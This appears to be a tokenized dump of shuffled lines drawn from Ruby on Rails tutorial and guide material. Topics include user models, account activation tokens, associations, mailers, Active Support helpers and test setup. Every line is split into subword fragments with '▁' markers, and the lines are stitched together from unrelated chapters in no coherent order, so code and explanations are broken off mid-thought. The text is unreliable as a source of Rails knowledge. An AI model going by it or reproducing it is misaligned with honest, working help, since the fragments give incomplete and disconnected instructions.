▁When ▁insert ing ▁into ▁an ▁SQL ▁string , ▁though , ▁you ▁don ' t ▁need ▁to ▁do ▁this ; ▁the ▁\ k ode { ?}\ ▁inter p ol ation ▁take s ▁care ▁of ▁it ▁for ▁you ▁( and ▁in ▁fact ▁eliminate s ▁some ▁database - dependent ▁in com p at i b i li t ies ) .
▁A mong ▁other ▁things , ▁this ▁material ▁is ▁likely ▁to ▁go ▁out ▁of ▁date ▁faster ▁than ▁the ▁rest ▁of ▁the ▁tutorial , ▁so ▁you ▁should n ' t ▁expect ▁everything ▁on ▁your ▁system ▁to ▁match ▁the ▁examples ▁exactly , ▁and ▁you ▁may ▁have ▁to ▁ Google ▁around ▁to ▁get ▁everything ▁to ▁work .
▁C al c ul ation s
▁You ▁can ▁obtain ▁a ▁ safe ▁string ▁from ▁a ▁given ▁one ▁with ▁the ▁` html _ safe ` ▁method :
▁These ▁JSON ▁gem ▁API s ▁are ▁mean t ▁for ▁serializ ing ▁and ╼ de s er ia li z ing ▁arbitrar y ▁Ruby ▁objects ▁and ▁are ▁generally ▁[ un safe ]( http :// www ▖ ruby - doc ▖ org / s td lib - 2▖0▖ 0 / lib doc / json / rdoc / JSON ▖ html # method - i - load ) .
▁password _ field (: login , ▁: pass )
▁( The ▁scaffold ▁code ▁is ▁ugly ▁and ▁confusing , ▁so ▁I ' ve ▁ suppress ed ▁it ▖)
▁' ssl _ error ' ▖ humanize ▁# ▁=> ▁" SSL ▁error "
▁As ▁a ▁result ▁of ▁the ▁callback , ▁when ▁a ▁new ▁user ▁is ▁defined ▁with ▁\ k ode { User ▖ new } ▁( as ▁in ▁user ▁signup , ▁Listing ~\ ref { code : create _ action _ strong _ parameters }), ▁it ▁will ▁automatically ▁get ▁both ▁\ k ode { activation \_ token } ▁and ▁\ k ode { activation \_ digest } ▁attributes ; ▁because ▁the ▁latter ▁is ▁ associated ▁with ▁a ▁column ▁in ▁the ▁database ▁( Figure ~\ ref { fig : user _ model _ account _ activation }), ▁it ▁will ▁be ▁written ▁automatically ▁when ▁the ▁user ▁is ▁saved .
▁headers [" X - SMTP API - C A TE G O RY "] ▁= ▁@ business ▖ code
▁In ▁case ▁of ▁key ▁co ll is ion , ▁one ▁of ▁the ▁values ▁will ▁be ▁ ch o s en ▖
▁def ▁self ▖ deliver ing _ email ( message )
▁in ▁Listing ~\ ref { code : home _ page _ passing } .
▁WARNING : ▁An y ▁class ▁can ▁di s allow ▁duplication ▁by ▁remov ing ▁` dup ` ▁and ▁` clone ` ▁or ▁ ra is ing ▁exception s ▁from ▁them ▖
▁- 2 1 ▖ ordinal ▁# ▁=> ▁" st "
▁Instead , ▁we ' ll ▁include ▁the ▁relevant ▁data ▁( including ▁the ▁activation ▁token ▁and ▁activation ▁status ) ▁in ▁the ▁User ▁model .
▁A ▁test ▁for ▁the ▁reject ion ▁of ▁duplicate ▁email ▁addresses ▖
▁This ▁allows ▁us ▁to ▁specify ▁which ▁parameters ▁are ▁\ emph { require d } ▁and ▁which ▁one s ▁are ▁\ emph { permitted } .
▁If ▁such ▁a ▁day ▁does ▁not ▁exist , ▁the ▁last ▁day ▁of ▁the ▁corresponding ▁ month ▁is ▁returned :
▁We ' ll ▁implement ▁all ▁but ▁the ▁last ▁one ▁by ▁the ▁end ▁of ▁this ▁chapter .
▁* ▁All ▁dynamic ▁methods ▁except ▁for ▁` find _ by _▖▖▖` ▁and ▁` find _ by _ ▖▖▖ !` ▁are ▁ deprecated .
▁To ▁support ▁cases ▁such ▁as ▁this , ▁Active ▁Support ▁allows ▁you ▁to ▁specify ▁ acronym s ▁in ▁` config / initializers / inflections ▖ rb `:
▁When ▁you ▁assign ▁an ▁object ▁to ▁a ▁` has _ one ` ▁association , ▁that ▁object ▁is ▁automatically ▁saved ▁( in ▁order ▁to ▁update ▁its ▁foreign ▁key )▖
▁HTTP /1▖1 ▁200 ▁OK ╼ Server : ▁Co w bo y
▁### ▁Other ▁ Gem ▁ Dependencies
▁Create s ▁a ▁form ▁and ▁a ▁scope ▁around ▁a ▁specific ▁model ▁object ▁that ▁is ▁used ▁as ▁a ▁base ▁for ▁question ing ▁about ▁values ▁for ▁the ▁fields .
▁flash [: not ice ] ▁= ▁" Comment ▁has ▁been ▁created !"
▁class ▁E s s a y ▁< ▁ActiveRecord :: Base
▁Using ▁a ▁different ▁class ▁for ▁each ▁key ▁allows ▁us ▁to ▁apply ▁different ▁style s ▁to ▁different ▁kind s ▁of ▁messages .
▁resources ▁: users , ▁do
▁### ▁M a x im um
▁In ▁order ▁to ▁have ▁a ▁ ne ar - zero ▁default ▁ foot print , ▁Active ▁Support ▁does ▁not ▁load ▁anything ▁by ▁default ▖
▁P utting ▁together ▁the ▁discussion ▁above ▁yields ▁the ▁User ▁model ▁show n ▁in ▁Listing ~\ ref { code : user _ model _ activation _ code } .
▁Fin ally , ▁the ▁two ▁features ▁complement ▁each ▁other ▁nicely : ▁password ▁resets ▁involve ▁sending ▁a ▁reset ▁link ▁to ▁a ▁user ' s ▁email ▁address , ▁the ▁ validity ▁of ▁which ▁is ▁ confirmed ▁by ▁the ▁initial ▁account ▁activation
▁#### ▁` reverse _ merge ` ▁and ▁` reverse _ merge !
▁The ▁SQL ▁query ▁used ▁by ▁this ▁find ▁call ▁will ▁be ▁some what ▁like :
▁would n ' t ▁work .
▁\ chapter { Model ing ▁users } ▁% ▁( fold )╼\ label { cha : modeling _ users }╼╼
▁This ▁chapter ▁cover s ▁a ▁lot ▁of ▁material , ▁and ▁it ' s ▁OK ▁not ▁to ▁get ▁it ▁all ▁on ▁the ▁first ▁pass .
▁If ▁you ▁get ▁the ▁above ▁error , ▁you ▁m ight ▁want ▁to ▁increase ▁the ▁size ▁of ▁connection ╼ po ol ▁by ▁ increment ing ▁the ▁` po ol ` ▁option ▁in ▁` database ▖ yml `
▁It ▁returns ▁an ▁array ▁of ▁all ▁the ▁errors ▁for ╼` : attribute ` ▖
▁* ▁` assets : precompile : primary ` ▁and ▁` assets : precompile : all ` ▁have ▁been ▁removed ▖
▁The ▁code ▁to ▁create ▁the ▁m app ing ▁of ▁user ▁URLs ▁to ▁controller ▁actions ▁for ▁the ▁Users ▁resource ▁appears ▁in ▁Listing ~\ ref { code : rails _ routes } ; ▁this ▁code ▁effective ly ▁set s ▁up ▁the ▁table ▁of ▁URL / action ▁pair s ▁seen ▁in ▁Table ~\ ref { table : user _ url s } .
▁In ▁Listing ~\ ref { code : user _ model _ remember }, ▁we ▁defined ▁the ▁new ▁token ▁and ▁digest ▁class ▁methods ▁by ▁explicitly ▁prefix ing ▁them ▁with ▁\ k ode { User } .
▁We ▁implement ▁an ▁ authorization ▁using ▁before ▁filter s .
▁As ▁a ▁result , ▁\ k ode { log \_ in \_ as } ▁should ▁ de t ec t ▁the ▁kind ▁of ▁test ▁being ▁used ▁and ▁a d just ▁according ly .
▁But ▁you ' ve ▁seen ▁the ▁\ href { http :// www ▖ im db ▖ com / title / tt 04 99 5 4 9 /}{ mov i e }, ▁so ▁you ▁already ▁ k new ▁this .
▁Wi ll ▁render ▁the ▁HTML ▁part ▁using ▁the ▁` my _ layout ▖ html ▖ erb ` ▁file ▁and ▁the ▁text ▁part ╼ with ▁the ▁usual ▁` user _ mailer ▖ text ▖ erb ` ▁file ▁if ▁it ▁exists .
▁For ▁example , ▁to ▁link ▁to ▁a ▁stylesheet ▁file ▁that ▁is ▁inside ▁a ▁directory ▁called ▁` stylesheets ` ▁inside ▁of ▁one ▁of ▁` app / assets `, ▁` lib / assets ` ▁or ▁` vendor / assets `, ▁you ▁would ▁do ▁this :
▁# ▁=> ▁Tue , ▁09 ▁A ug ▁2011 ▁23:2 1 : 11 ▁UTC ▁+00:00
▁In ▁the ▁case ▁of ▁` resources ▁: photos `:
▁Now ▁that ▁we ▁have ▁working ▁following ▁and ▁followers ▁pages , ▁we ' ll ▁write ▁a ▁couple ▁of ▁short ▁integration ▁tests ▁to ▁verify ▁their ▁behavior .
▁5 55 123 4 ▖ to _ s (: phone )
▁Add ▁this ▁line ▁to ▁` lib / blorgh ▖ rb ` ▁inside ▁the ╼ engine :
▁ ╼ ▁> > ▁Rails ▖ env ▖ production ?
▁Logging ▁in ▁a ▁user .
▁ Cl ic k ▁on ▁the ▁link ▁below ▁to ▁activate ▁your ▁account : ╼╼ http :// rails - tutorial - c 9 - mhartl ▖ c 9 ▖ io / account _ activations / ╼ f F b _ F 9 4 m g Q t m l S v R F G s IT w / edit ?
▁With ▁this ▁configuration ▁complete , ▁we ' re ▁now ▁ready ▁to ▁write ▁the ▁code ▁to ▁log ▁users ▁in .
▁in ▁Listing ~\ ref { code : delete _ destroy _ test } .
▁A ▁test ▁for ▁the ▁Contact ▁page ▖
▁On ▁some ▁systems , ▁you ▁may ▁get ▁the ▁ warning
▁For ▁example , ▁Rails ▁was ▁one ▁of ▁the ▁first ▁framework s ▁to ▁fully ▁digest ▁and ▁implement ▁the ▁REST ▁ ar ch ite c t ur al ▁style ▁for ▁ str u c t ur ing ▁web ▁applications ▁( which ▁we ' ll ▁be ▁learning ▁about ▁throughout ▁this ▁tutorial ) .
▁< li >`: port ` ▁- ▁On ▁the ▁off ▁chance ▁that ▁your ▁mail ▁server ▁doesn ' t ▁run ▁on ▁ port ▁ 25 , ▁you ▁can ▁change ▁it ▖ </ li >
▁In ▁particular , ▁including ▁multiple ▁full - size d ▁files ▁can ▁significant ly ▁ s low ▁page - load ▁time s , ▁which ▁is ▁one ▁of ▁the ▁most ▁important ▁ factor s ▁a ffect ing ▁the ▁ q u al ity ▁of ▁the ▁user ▁experience .
▁As ▁one ▁final ▁example ▁of ▁blocks , ▁we ▁can ▁take ▁a ▁look ▁at ▁an ▁individual ▁test ▁from ▁the ▁file ▁in ▁Listing ~\ ref { code : home _ base _ title _ spec } :
▁date ▖ beginning _ of _ minute ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 : 55 :00 ▁+0200 ▁2010
▁ Content s
▁* ▁The ▁ Turbolinks ▁gem .
▁created _ at : ▁"2013-03-11 ▁20 : 45 : 19 ", ▁updated _ at : ▁"2013-03-11 ▁20 : 45 : 19 ",
▁| ▁| ▁20 1 ▁| ▁: created ▁|
▁As ▁is ▁convention al ▁in ▁most ▁computer ▁languages , ▁Ruby ▁arrays ▁are ▁\ emph { zero - offset }, ▁which ▁means ▁that ▁the ▁first ▁element ▁in ▁the ▁array ▁has ▁index ~ 0, ▁the ▁second ▁has ▁index ~ 1, ▁and ▁so ▁on :
▁With ▁the ▁validation ▁now ▁in ▁place , ▁when ▁you ▁call ▁`@ article ▖ save ` ▁on ▁an ▁invalid ╼ article , ▁it ▁will ▁return ▁` false ` ▖
▁* ▁How ▁to ▁run ▁job s ▁in ▁the ▁background .
▁Using ▁Listing ~\ ref { code : string _ shuffle _ two } ▁as ▁a ▁guide , ▁add ▁a ▁\ k ode { shuffle } ▁method ▁to ▁the ▁\ k ode { String } ▁class .
▁#### ▁ Custom ize ▁CDN ▁ Caching ▁Be ha v i or
▁M i x ing ▁ ERB ▁into ▁your ▁controllers ▁def e at s ▁the ▁ MVC ▁or i ent ation ▁of ▁Rails ▁and ▁will ▁make ▁it ▁hard er ▁for ▁other ▁developers ▁to ▁follow ▁the ▁logic ▁of ▁your ▁project ▖
▁# ▁=> ▁ 123 ▁5 55 ▁ 123 4
▁There ▁may ▁be ▁time s ▁when ▁you ▁wish ▁to ▁customize ▁the ▁query ▁used ▁by ▁` has _ many ` ▖
▁In ▁Ruby , ▁they ▁are ▁optional ; ▁these ▁two ▁are ▁equivalent :
▁First , ▁the ▁` author _ name ` ▁text ▁field ▁needs ▁to ▁be ▁added ▁to ▁the ╼` app / views / blorgh / articles / _ form ▖ html ▖ erb ` ▁partial ▁inside ▁the ▁engine ▖
▁When ▁using ▁class ▁names ▁ com po s ed ╼ of ▁two ▁or ▁more ▁words , ▁the ▁model ▁class ▁name ▁should ▁follow ▁the ▁Ruby ▁convention s ,╼ using ▁the ▁ CamelCase ▁form , ▁while ▁the ▁table ▁name ▁must ▁contain ▁the ▁words ▁separate d ╼ by ▁ underscore s ▖
▁On ce ▁the ▁changes ▁in ▁Rails ▁just if y ▁the ▁effort , ▁I ▁plan ▁to ▁ prepare ▁a ▁full ▁new ▁ edition ▁of ▁the ▁\ emph { Rails ▁Tutorial }, ▁including ▁cover age ▁of ▁topic s ▁such ▁as ▁\ emph { Turbolinks } ▁and ▁\ emph { Russ i an ▁do ll ▁ caching }, ▁as ▁well ▁as ▁some ▁new ▁aspect s ▁of ▁RSpec , ▁such ▁as ▁\ emph { feature ▁ spec s } ▖)
▁ Regular ▁expression s ▁are ▁ crypt ic ▁but ▁powerful .
▁This ▁code ▁has ▁a ▁form id able ▁combination ▁of ▁Rails , ▁Ruby , ▁and ▁SQL , ▁but ▁it ▁does ▁the ▁job , ▁and ▁does ▁it ▁well :
▁belongs _ to ▁: part
▁# ▁equivalent ▁to ▁Time ▖ current ▖ advance ( months : ▁4 , ▁ years : ▁5 )
▁After ▁loading ▁the ▁framework ▁and ▁any ▁gems ▁in ▁your ▁application , ▁Rails ▁turn s ▁to ▁loading ▁ initializers ▖
▁#### ▁date _ select
▁Re order ▁section s ▁to ▁emphasize ▁favor ed ▁approach es ▁if ▁needed , ▁etc ▖
▁Of ▁course , ▁the ▁views ▁in ▁Listing ~\ ref { code : home _ view _ erb _ title }, ▁Listing ~\ ref { code : help _ view _ erb _ title }, ▁and ▁Listing ~\ ref { code : about _ view _ erb _ title } ▁are ▁ still ▁ filled ▁with ▁all ▁the ▁HTML ▁structure ▁included ▁in ▁the ▁layout , ▁so ▁we ▁have ▁to ▁remove ▁it , ▁leav ing ▁only ▁the ▁ interior ▁contents .
▁create ▁Gemfile
▁#### ▁image _ url
▁Note ▁that ▁the ▁ implicit ▁render ▁done ▁by ▁ ActionController ▁ de t ec t s ▁if ▁` render ` ▁has ▁been ▁called , ▁so ▁the ▁following ▁will ▁work ▁without ▁errors :
▁Ou r ▁principal ▁tool ▁for ▁learning ▁Ruby ▁will ▁be ▁the ▁\ emph { Rails ▁console }, ▁a ▁command - line ▁tool ▁for ▁interact ing ▁with ▁Rails ▁applications ▁first ▁seen ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } .
▁With out ▁calling ╼` isolate _ namespace `, ▁the ▁engine ' s ▁helpers ▁would ▁be ▁included ▁in ▁an ▁application ' s ╼ controllers .
▁# ▁I gnore ▁other ▁un ne ed ed ▁files .
▁The ▁main ▁exception ▁is ▁Ruby ▁itself : ▁ 1▖9▖3 ▁and ▁ 2▖0▖ 0 ▁are ▁virtual ly ▁identical ▁for ▁the ▁purposes ▁of ▁this ▁tutorial , ▁so ▁feel ▁free ▁to ▁use ▁either ▁one .
▁We ▁can ▁see ▁the ▁result ▁of ▁the ▁before ▁filter ▁in ▁Listing ~\ ref { code : authorize _ before _ filter } ▁by ▁logging ▁out ▁and ▁attempt ing ▁to ▁access ▁the ▁user ▁edit ▁page ▁\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }, ▁as ▁seen ▁in ▁Figure ~\ ref { fig : protected _ log _ in } .
▁By ▁default ,╼ this ▁is ▁the ▁English ▁- ▁or ▁" en " ▁- ▁template ▖
▁These ▁sort s ▁of ▁hashes - of - hashes , ▁or ▁\ emph { nested ▁hashes }, ▁are ▁heav ily ▁used ▁by ▁Rails , ▁as ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : unsuccessful _ signup s } .
▁in ▁Listing ~\ ref { code : sample _ microposts } .
▁This ▁is ▁generally ▁consider ed ▁to ▁be ▁a ▁best - p ra c t ice ╼ with in ▁the ▁front end ▁ community , ▁but ▁you ▁may ▁ o cc as ion ally ▁read ▁tutorial s ▁that ╼ demo n str ate ▁other ▁ways .
▁Inde ed , ▁at ▁this ▁point ▁the ▁Application ▁controller ▁is ▁the ▁only ▁controller ▁we ▁have , ▁which ▁you ▁can ▁verify ▁by ▁running
▁An ▁initializer ▁is ▁any ▁Ruby ▁file ▁store d ▁under ▁` config / initializers ` ▁in ▁your ▁application ▖
▁The ▁code ▁in ▁this ▁section ▁is ▁advanced ▁and ▁is ▁present ed ▁for ▁convenience ▁only ; ▁you ▁are ▁not ▁expected ▁to ▁understand ▁it ▁at ▁this ▁time .
▁#### ▁Scopes ▁for ▁` has _ many `
▁If ▁you ▁want ▁more ▁flexibility ▁you ▁can ▁also ▁pass ▁a ▁block ▁and ▁render ▁specific ╼ template s ▁or ▁even ▁render ▁ inline ▁or ▁text ▁without ▁using ▁a ▁template ▁file :
▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010 ▁00:00:00 ▁+0000
▁create ▁app / assets / stylesheets / blorgh / articles ▖ css
▁Then ▁run ▁the ▁tests :
▁For ▁convenience , ▁we ' ll ▁use ▁the ▁\ k ode { create } ▁method ▁discuss ed ▁in ▁Section ~\ ref { sec : creating _ user _ objects }, ▁but ▁in ▁the ▁present ▁case ▁we ' ll ▁take ▁care ▁\ emph { not } ▁to ▁start ▁in ▁a ▁ sandbox ▁so ▁that ▁the ▁result ing ▁user ▁will ▁be ▁saved ▁to ▁the ▁database .
▁Let ' s ▁say ▁that ▁` users ` ▁table ▁has ▁` id ` ▁as ▁the ▁primary _ key ▁but ▁it ▁also ▁has ╼` guid ` ▁column ▖
▁In ▁the ▁present ▁case , ▁a lthough ▁we ▁are ▁ still ▁deal ing ▁with ▁users , ▁the ▁user ▁following ▁another ▁user ▁is ▁now ▁identifie d ▁with ▁the ▁foreign ▁key ▁\ k ode { follower \_ id }, ▁so ▁we ▁have ▁to ▁tell ▁that ▁to ▁Rails .
▁<%= ▁simple _ format ( article ▖ text ) ▁%>
▁Rails ▁will ▁create ▁sever al ▁files ▁and ▁a ▁route ▁for ▁you .
▁# ▁this ▁line ▁add s ▁an ▁ integer ▁column ▁called ▁` article _ id ` .
▁After ▁apply ing ▁their ▁branch , ▁test ▁it ▁out !
▁* ▁` touch `
▁Then ▁push ▁up ▁the ▁remote ▁GitHub ▁repository ▁and ▁the ▁Heroku ▁production ▁server :
▁Otherwise , ▁\ href { http :// install rails ▖ com /}{ InstallRails ▖ com } ▁( Section ~\ ref { sec : up _ and _ running }) ▁includes ▁instructions ▁for ▁ installing ▁Git ▁on ▁your ▁system .
▁By ▁default ▁they ▁are , ▁but ▁this ▁can ▁be ▁turn ed ▁off ▁to ▁help ▁functional ▁testing .
▁( Test ing ▁for ▁this ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : updating _ deleting _ exercises })▖)
▁The ▁\ k ode { Micropost } ▁class , ▁with ▁inheritance .
▁To ▁include ▁more ▁than ▁one ▁clause , ▁we ▁can ▁use ▁\ k ode { el s if } ▁(\ k ode { else } ▁+ ▁\ k ode { if }) :
▁ ETag s ▁are ▁used ▁to ▁validate ▁cache .
▁The ▁` raw ` ▁helper ▁calls ▁` html _ safe ` ▁for ▁you :
▁For ▁convenience ▁` class _ attribute ` ▁also ▁defines ▁an ▁instance ▁ predicate ▁which ▁is ▁the ▁double ▁ n eg ation ▁of ▁what ▁the ▁instance ▁reader ▁returns ▖
▁* ▁` config ▖ log _ level ` ▁defines ▁the ▁verb o s ity ▁of ▁the ▁Rails ▁ logger ▖
▁user ▁= ▁User ▖ find _ by _ token ( params [: token ])
▁# ▁Re p la ce ▁with ▁code ▁to ▁make ▁a ▁user ▁variable
▁which ▁would ▁produce :
▁Here , ▁you ▁are ╼ requiring ▁the ▁files ▁` jquery ▖ js ` ▁and ▁` jquery _ ujs ▖ js ` ▁that ▁are ▁available ▁some where ╼ in ▁the ▁search ▁path ▁for ▁Sprockets ▖
▁The ▁Static ▁Pages ▁controller ▁made ▁by ▁Listing ~\ ref { code : generating _ pages } .
▁in ▁Listing ~\ ref { code : micropost _ validity _ test } .
▁Defin ing ▁a ▁\ k ode { full \_ title } ▁helper .
▁The ▁routes ▁file ▁is ▁responsib le ▁for ▁implement ing ▁the ▁route r ▁( se en ▁in ▁Figure ~\ ref { fig : mvc _ detailed }) ▁that ▁defines ▁the ▁correspond ence ▁between ▁URLs ▁and ▁web ▁pages .
▁by ▁ Michael ▁Hartl
▁01 : 05 : 4 2 ", ▁updated _ at : ▁"2013-03-11 ▁01 : 05 : 4 2 ">
▁This ▁order ▁is ▁important ▁toward s ▁the ▁end ▁of ▁ months ▖
▁These ▁paths ▁must ▁be ╼ spec if i ed ▁relative ▁to ▁the ▁manifest ▁file ▖
▁You ▁can ▁also ▁opt ▁to ▁include ▁controller ▁specific ▁stylesheets ▁and ▁JavaScript ▁files ╼ only ▁in ▁their ▁respective ▁controllers ▁using ▁the ▁following :
▁The ▁reason ▁for ▁storing ▁only ▁ encrypted ▁token s ▁is ▁so ▁that , ▁even ▁if ▁our ▁entire ▁database ▁is ▁ com p r o mis ed , ▁the ▁attacker ▁ still ▁won ' t ▁be ▁able ▁to ▁use ▁the ▁remember ▁token s ▁to ▁sign ▁in .
▁ Chang ing ▁the ▁layout ▁links ▁for ▁signed - in ▁users .
▁in ▁Listing ~\ ref { code : destroy _ forget } ▁and
▁( Re call ▁that ▁\ k ode { created \_ at } ▁and ▁\ k ode { updated \_ at } ▁are ▁`` magic '' ▁columns , ▁automatically ▁set ▁to ▁the ▁proper ▁creation ▁and ▁update ▁timestamp s , ▁so ▁any ▁explicit ▁initialization ▁values ▁are ▁over written ▁by ▁the ▁magic ▖)
▁You ▁should ▁upgrade ▁as ▁ early ▁as ▁possible .
▁#### # ▁` collection ▖ clear `
▁A ▁ summary ▁of ▁user / active ▁relationship ▁association ▁methods .
▁In ▁addition , ▁we ' ll ▁include ▁a ▁ ra s ter ▁of ▁user ▁profile ▁image ▁links ▁in ▁the ▁ sidebar .
▁# ▁=> ▁< input ▁type =" text " ▁id =" login _ pass " ▁name =" login [ pass ] " ▁value ="# {@ login ▖ pass } " ▁/>
▁The ▁ answer ▁is ▁that ▁the ▁tag ▁has ▁a ▁clear ▁meaning ▁to ▁ human ▁readers , ▁and ▁the ▁class ▁is ▁used ▁by ▁Bootstrap .
▁A ▁test ▁for ▁un following ▁a ▁user .
▁ INNER ▁JOIN ▁comments ▁ ON ▁comments ▖ article _ id ▁= ▁articles ▖ id
▁S ince ▁it ' s ▁so ▁common ▁for ▁hashes ▁to ▁use ▁symbols ▁as ▁keys , ▁as ▁of ▁version ▁1▖9 ▁Ruby ▁supports ▁a ▁new ▁syntax ▁just ▁for ▁this ▁special ▁case :
▁By ▁the ▁way , ▁the ▁extra ▁level ▁of ▁indentation ▁on ▁the ▁\ k ode { user \_ params } ▁method ▁is ▁design ed ▁to ▁make ▁it ▁ visual ly ▁apparent ▁which ▁methods ▁are ▁defined ▁after ▁\ k ode { private } .
▁When ▁you ▁call ▁the ▁` mail ` ▁method ▁now , ▁Action ▁Mailer ▁will ▁ de t ec t ▁the ▁two ▁templates ╼ ( text ▁and ▁HTML ) ▁and ▁automatically ▁generate ▁a ▁` multipart / alternative ` ▁email .
▁format ▖ html ▁ { ▁render ▁' another _ template ' ▁ }
▁ Adding ▁a ▁\ k ode { log \_ in \_ as } ▁helper .
▁With ▁the ▁code ▁as ▁above , ▁the ▁mailer ▁test ▁should ▁be ▁\ passing :
▁| ▁| ▁50 4 ▁| ▁: g ate way _ time out ▁|
▁# ▁=> ▁Ruby ▁on ▁Rails
▁For ▁a ▁complete ▁write up ▁of ▁possible ▁configuration s ▁see ▁the ╼[ C on fig ur ing ▁Action ▁Mailer ]( configuring ▖ html # configuring - action - mailer ) ▁in ╼ our ▁Configur ing ▁Rails ▁Application s ▁guide .
▁class ▁ Library ▁< ▁ActiveRecord :: Base
▁Then ▁deploy ▁to ▁production :
▁ ╼ ▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial .
▁They ▁also ▁have ▁methods ▁called ╼ " action s " ▁and ▁use ▁views ▁to ▁structure ▁the ▁content ▖
▁This ▁association ▁indicates ╼ that ▁the ▁declar ing ▁model ▁can ▁be ▁match ed ▁with ▁one ▁instance ▁of ▁another ▁model ▁by ▁proceeding ▁ _ through _ ▁a ▁third ▁model .
▁Note ▁that ▁the ▁ assert ion ▁for ▁the ▁root ▁path ▁verifie s ▁that ▁there ▁are ▁\ emph { two } ▁such ▁links ▁( one ▁each ▁for ▁the ▁ logo ▁and ▁navigation ▁ menu ▁element ) :
▁We ' ll ▁start ▁by ▁refactoring ▁the ▁feed ▁with ▁the ▁slightly ▁ modified ▁code ▁in ▁Listing ~\ ref { code : feed _ second _ cut } .
▁| ▁| ▁50 3 ▁| ▁: service _ un available ▁|
▁Then ▁ initialize ▁Guard ▁so ▁that ▁it ▁works ▁with ▁RSpec :
▁Similar ▁to ▁the ▁` ( ? ) ` ▁replace ment ▁style ▁of ▁params , ▁you ▁can ▁also ▁specify ▁keys / value s ▁hash ▁in ▁your ▁array ▁conditions :
▁Like ▁sessions , ▁account ▁ activations ▁can ▁be ▁model ed ▁as ▁a ▁resource ▁ de s p ite ▁not ▁being ▁Active ▁Record ▁objects .
▁This ▁means ▁when ▁a ▁browser ▁requests ▁an ▁asset ▁from ▁the ▁CDN ▁and ╼ the re ▁is ▁a ▁cache ▁ mis s , ▁it ▁will ▁gra b ▁the ▁file ▁from ▁your ▁server ▁on ▁the ▁f ly ▁and ╼ the n ▁cache ▁it ▖
▁route ▁resources ▁: microposts
▁One ▁way ▁to ▁find ▁the ▁proper ▁model ▁is ▁to ▁consider ▁how ▁we ▁m ight ▁implement ▁the ▁a c t ▁of ▁\ emph { following } ▁in ▁a ▁web ▁application .
▁in ▁Listing ~\ ref { code : gravatar _ option } .
▁In ▁this ▁case , ▁it ' s ▁the ╼` articles / new ` ▁template ▖
▁e ▖ prev ent Default ()
▁( We ' ll ▁put ▁the ▁\ k ode { created \_ at } ▁column ▁to ▁work ▁in ▁Section ~\ ref { sec : ordering _ and _ dependency } ▁and ▁Section ~\ ref { sec : augment ing _ the _ user _ show _ page } ▖)
▁See ▁[ a ▁list ▁of ▁A me ri can ▁and ▁B ri t is h ▁English ▁ s pe ll ing ▁difference s ▁here ]( http :// en ▖ w ikipedia ▖ org / wiki / A me ri can _ and _ B ri t is h _ E n g li sh _ s pe ll ing _ difference s ) .
▁get ▁' * pages ', ▁to : ▁' pages # show ', ▁format : ▁false
▁* ▁Doe s ▁it ▁have ▁the ▁proper ▁documentation ▁cover age ?
▁Rails ▁provides ▁the ▁\ k ode { flash } ▁as ▁a ▁standard ▁way ▁to ▁display ▁temporary ▁messages .
▁This ▁allows ▁us ▁to ▁re write ▁our ▁ SCSS ▁like ▁this :
▁The ▁method ▁` change ` ▁allows ▁you ▁to ▁get ▁a ▁new ▁ datetime ▁which ▁is ▁the ▁same ▁as ▁the ▁receiver ▁except ▁for ▁the ▁given ▁options , ▁which ▁may ▁include ▁`: year `, ▁`: month `, ▁`: day `, ▁`: hour `, ▁`: m in `, ▁`: sec `, ▁`: offset `, ▁`: start `:
▁Create ▁three ▁hashes ▁called ▁\ k ode { person 1 }, ▁\ k ode { person 2 }, ▁and ▁\ k ode { person 3 }, ▁with ▁first ▁and ▁last ▁names ▁under ▁the ▁keys ▁\ k ode { : first } ▁and ▁\ k ode { : last } .
▁< ul >
▁As ▁with ▁\ k ode { assert \_ no \_ difference }, ▁the ▁first ▁argument ▁is ▁the ▁string ▁\ k ode { ' User ▖ count ' }, ▁which ▁arrange s ▁for ▁a ▁compar is on ▁between ▁\ k ode { User ▖ count } ▁before ▁and ▁after ▁the ▁contents ▁of ▁the ▁\ k ode { assert \_ difference } ▁block .
▁Defaults ▁to ▁` / us r / s bin / sendmail ` .
▁Rails ▁know s ▁that ▁this ▁view ▁belongs ▁to ▁a ▁different ▁controller ▁because ▁of ▁the ▁ embedded ▁ slash ▁character ▁in ▁the ▁string ▖
▁For ▁now , ▁we ' ll ▁use ▁the ▁\ k ode { rspec } ▁command ▁at ▁the ▁command ▁line ▁( ex e cut ed ▁with ▁\ k ode { bundle ▁exec } ▁to ▁ensure ▁that ▁RSpec ▁run s ▁in ▁the ▁environment ▁specified ▁by ▁our ▁\ k ode { Gemfile })
▁Action ▁View ▁is ▁then ▁responsib le ▁for ▁ compiling ▁the ▁response .
▁admin = 1
▁# ▁For ce ▁all ▁access ▁to ▁the ▁app ▁over ▁SSL , ▁use ▁ Strict - Transport - Security , ▁and ▁use ▁secure ▁cookies .
▁This ▁c y c le ▁is ▁known ▁as ▁`` R ed , ▁ Green , ▁ Refactor '' .
▁The ▁` collection ▖ destroy ` ▁method ▁remove s ▁one ▁or ▁more ▁objects ▁from ▁the ▁collection ▁by ▁running ▁` destroy ` ▁on ▁each ▁record ▁in ▁the ▁join ▁table , ▁including ▁running ▁callbacks ▖
▁### ▁The ▁` has _ one ` ▁Association
▁config ▖ active _ record ▖ auto _ explain _ th re sh ol d _ in _ seconds ▁= ▁ 0▖5
▁ { a : ▁1 } ▖ with _ indifferent _ access ▖ except (" a ") ▁# ▁=> ▁ { }
▁It ' s ▁likely ▁that ▁many ▁of ▁the ▁idea s ▁in ▁this ▁section ▁won ' t ▁seem ▁obvious ▁at ▁first , ▁and ▁it ▁may ▁take ▁a ▁while ▁for ▁the ▁rather ▁complicated ▁data ▁model ▁to ▁ s in k ▁in .
▁ Follow ▁regular ▁p un c t u ation ▁rules :
▁A lthough ▁the ▁two ▁are ▁equivalent , ▁using ▁\ k ode { assert \_ no \_ difference } ▁is ▁ cleaner ▁and ▁is ▁more ▁ idiomatic ally ▁correct ▁Ruby .
▁There ▁is ▁a ▁naming ▁convention ▁for ▁views ▁in ▁Rails ▖
▁" name "▖ humanize ▁# ▁=> ▁" Name "
▁url : ▁<%= ▁ ENV [' DAT A BASE _ URL '] ▁%>
